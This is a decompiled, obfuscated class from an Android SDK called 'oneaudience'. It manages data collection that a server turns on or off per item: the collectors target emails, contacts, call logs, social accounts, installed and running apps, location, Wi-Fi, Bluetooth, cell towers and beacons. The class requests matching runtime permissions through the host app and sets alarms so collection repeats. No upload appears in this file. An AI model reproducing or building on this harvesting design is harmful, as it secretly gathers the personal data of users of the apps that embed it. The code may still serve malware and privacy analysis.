package com.oneaudience.sdk.p133a;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Build.VERSION;
import android.support.v4.app.NotificationCompat;
import com.a.a.e;
import com.oneaudience.sdk.C3843e;
import com.oneaudience.sdk.OneAudienceReceiver;
import com.oneaudience.sdk.model.DataPoint;
import com.oneaudience.sdk.model.ServerConfig;
import com.oneaudience.sdk.p135c.C3833d;
import com.oneaudience.sdk.p135c.p137b.C3827d;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Map;

public class C3795i {
    private static Map<String, C3784a> f9108b;
    private static SharedPreferences f9109c;
    private static C3795i f9110e;
    private static final String f9111f = C3843e.class.getSimpleName();
    private Context f9112a;
    private final int f9113d = 10000;
    private long f9114g = 0;

    private C3795i(Context context) {
        this.f9112a = context;
        f9109c = this.f9112a.getSharedPreferences("oneaudience", 0);
        f9108b = new HashMap();
        m12128e();
    }

    public static C3795i m12126a(Context context) {
        if (f9110e == null) {
            f9110e = new C3795i(context);
        }
        return f9110e;
    }

    private static String[] m12127b(Context context) {
        try {
            return context.getPackageManager().getPackageInfo(context.getPackageName(), 4096).requestedPermissions;
        } catch (NameNotFoundException e) {
            C3833d.m12248a(f9111f, "Can't get permissions", e);
            return null;
        }
    }

    private synchronized void m12128e() {
        String string = f9109c.getString("server_config", "");
        if (!string.isEmpty()) {
            for (DataPoint dataPoint : ((ServerConfig) new e().a(string, ServerConfig.class)).dataPoints) {
                if (dataPoint.enabled) {
                    if (dataPoint.name.equalsIgnoreCase("emailsDp")) {
                        f9108b.put(dataPoint.name, new C3798l(this.f9112a, dataPoint.name, dataPoint.activeScan, dataPoint.displayPermission, dataPoint.interval));
                    } else if (dataPoint.name.equalsIgnoreCase("carrierDp")) {
                        f9108b.put(dataPoint.name, new C3793g(this.f9112a, dataPoint.name, dataPoint.activeScan, dataPoint.displayPermission, dataPoint.interval));
                    } else if (dataPoint.name.equalsIgnoreCase("browserTypeDp")) {
                        f9108b.put(dataPoint.name, new C3791e(this.f9112a, dataPoint.name, dataPoint.activeScan, dataPoint.displayPermission, dataPoint.interval));
                    } else if (dataPoint.name.equalsIgnoreCase("contactsDp")) {
                        f9108b.put(dataPoint.name, new C3796j(this.f9112a, dataPoint.name, dataPoint.activeScan, dataPoint.displayPermission, dataPoint.interval));
                    } else if (dataPoint.name.equalsIgnoreCase("socialDp")) {
                        f9108b.put(dataPoint.name, new C3804p(this.f9112a, dataPoint.name, dataPoint.activeScan, dataPoint.displayPermission, dataPoint.interval));
                    } else if (dataPoint.name.equalsIgnoreCase("installedAppsDp")) {
                        f9108b.put(dataPoint.name, new C3801n(this.f9112a, dataPoint.name, dataPoint.activeScan, dataPoint.displayPermission, dataPoint.interval));
                    } else if (dataPoint.name.equalsIgnoreCase("callLogsDp")) {
                        f9108b.put(dataPoint.name, new C3792f(this.f9112a, dataPoint.name, dataPoint.activeScan, dataPoint.displayPermission, dataPoint.interval));
                    } else if (dataPoint.name.equalsIgnoreCase("basicDp")) {
                        f9108b.put(dataPoint.name, new C3785b(this.f9112a, dataPoint.name, dataPoint.activeScan, dataPoint.displayPermission, dataPoint.interval));
                    } else if (dataPoint.name.equalsIgnoreCase("wifiDp")) {
                        f9108b.put(dataPoint.name, new C3808r(this.f9112a, dataPoint.name, dataPoint.activeScan, dataPoint.displayPermission, dataPoint.interval, dataPoint.forceEnable));
                    } else if (dataPoint.name.equalsIgnoreCase("tvInputDp")) {
                        f9108b.put(dataPoint.name, new C3805q(this.f9112a, dataPoint.name, dataPoint.activeScan, dataPoint.displayPermission, dataPoint.interval));
                    } else if (dataPoint.name.equalsIgnoreCase("gameStatisticsDp")) {
                        f9108b.put(dataPoint.name, new C3800m(this.f9112a, dataPoint.name, dataPoint.activeScan, dataPoint.displayPermission, dataPoint.interval));
                    } else if (dataPoint.name.equalsIgnoreCase("bluetoothDp")) {
                        f9108b.put(dataPoint.name, new C3790d(this.f9112a, dataPoint.name, dataPoint.activeScan, dataPoint.displayPermission, dataPoint.interval));
                    } else if (dataPoint.name.equalsIgnoreCase("locationDp")) {
                        f9108b.put(dataPoint.name, new C3803o(this.f9112a, dataPoint.name, dataPoint.activeScan, dataPoint.displayPermission, dataPoint.interval));
                    } else if (dataPoint.name.equalsIgnoreCase("cellTowerDp")) {
                        f9108b.put(dataPoint.name, new C3794h(this.f9112a, dataPoint.name, dataPoint.activeScan, dataPoint.displayPermission, dataPoint.interval));
                    } else if (dataPoint.name.equalsIgnoreCase("beaconDp")) {
                        f9108b.put(dataPoint.name, new C3787c(this.f9112a, dataPoint.name, dataPoint.activeScan, dataPoint.displayPermission, dataPoint.interval));
                    } else if (dataPoint.name.equalsIgnoreCase("currentAppsDp")) {
                        f9108b.put(dataPoint.name, new C3797k(this.f9112a, dataPoint.name, dataPoint.activeScan, dataPoint.displayPermission, dataPoint.interval));
                    }
                }
            }
        }
    }

    private static synchronized List<Thread> m12129f() {
        List<Thread> list;
        synchronized (C3795i.class) {
            if (f9108b == null || f9108b.size() == 0) {
                list = null;
            } else {
                List<Thread> arrayList = new ArrayList();
                long currentTimeMillis = System.currentTimeMillis() / 1000;
                for (C3784a c3784a : f9108b.values()) {
                    Thread f = c3784a.m12089f();
                    if (currentTimeMillis - c3784a.m12091h() >= c3784a.m12088e() && f != null) {
                        arrayList.add(f);
                    }
                }
                list = arrayList;
            }
        }
        return list;
    }

    private static synchronized long m12130g() {
        long j;
        synchronized (C3795i.class) {
            if (f9108b == null) {
                j = 0;
            } else {
                j = Long.MAX_VALUE;
                long currentTimeMillis = System.currentTimeMillis() / 1000;
                for (C3784a c3784a : f9108b.values()) {
                    long e = (c3784a.m12088e() - currentTimeMillis) - c3784a.m12091h() > 0 ? (c3784a.m12088e() - currentTimeMillis) - c3784a.m12091h() : c3784a.m12088e();
                    if (e >= j) {
                        e = j;
                    }
                    j = e;
                }
            }
        }
        return j;
    }

    private boolean m12131h() {
        if (this.f9114g == 0 || System.currentTimeMillis() - this.f9114g >= 10000) {
            this.f9114g = System.currentTimeMillis();
            C3833d.m12252c(f9111f, "** setting timestamp **");
            return true;
        }
        C3833d.m12252c(f9111f, "** preventing duplicate call **");
        return false;
    }

    public synchronized void m12132a() {
        m12128e();
    }

    public boolean m12133a(Activity activity) {
        if (VERSION.SDK_INT >= 23) {
            String[] b = C3795i.m12127b(activity);
            if (b != null) {
                List asList = Arrays.asList(b);
                ArrayList arrayList = new ArrayList();
                ArrayList arrayList2 = new ArrayList();
                for (C3784a c3784a : f9108b.values()) {
                    if (c3784a.m12087d()) {
                        for (Object add : c3784a.mo6805b()) {
                            arrayList.add(add);
                        }
                    }
                }
                Collection hashSet = new HashSet();
                hashSet.addAll(arrayList);
                arrayList.clear();
                arrayList.addAll(hashSet);
                Iterator it = arrayList.iterator();
                while (it.hasNext()) {
                    String str = (String) it.next();
                    if (asList.contains(str) && !C3843e.m12285a((Context) activity, str)) {
                        arrayList2.add(str);
                    }
                }
                C3833d.m12246a(f9111f, "Found " + arrayList2.size() + " permissions to request");
                if (!arrayList2.isEmpty()) {
                    activity.requestPermissions((String[]) arrayList2.toArray(new String[arrayList2.size()]), 934567);
                }
                return !arrayList2.isEmpty();
            }
        }
        C3833d.m12246a(f9111f, "Don't request for permissions: Android version lower than 6.0");
        return false;
    }

    public synchronized boolean m12134b() {
        boolean z = false;
        synchronized (this) {
            if (f9108b == null || f9108b.size() == 0) {
                m12135c();
            } else if (m12131h()) {
                List<Thread> f = C3795i.m12129f();
                m12136d();
                if (f != null) {
                    for (Thread start : f) {
                        start.start();
                    }
                    z = true;
                }
            }
        }
        return z;
    }

    public void m12135c() {
        Thread f = new C3785b(this.f9112a, "basicDp", true, true, 0).m12089f();
        f.run();
        try {
            f.join(10000);
        } catch (InterruptedException e) {
            C3833d.m12256e(f9111f, "Could not collect basic data");
        }
    }

    public synchronized void m12136d() {
        AlarmManager alarmManager = (AlarmManager) this.f9112a.getSystemService(NotificationCompat.CATEGORY_ALARM);
        Intent intent = new Intent(this.f9112a, OneAudienceReceiver.class);
        intent.setAction("com.oneaudience.action.COLLECTION");
        PendingIntent broadcast = PendingIntent.getBroadcast(this.f9112a, 0, intent, 134217728);
        long currentTimeMillis = System.currentTimeMillis() + C3795i.m12130g();
        C3833d.m12253c(f9111f, "configuration properties after sync -> Next Time: %1$s, interval: %2$s", C3827d.m12235a(currentTimeMillis), C3827d.m12236b(C3795i.m12130g()));
        alarmManager.set(0, currentTimeMillis, broadcast);
    }
}
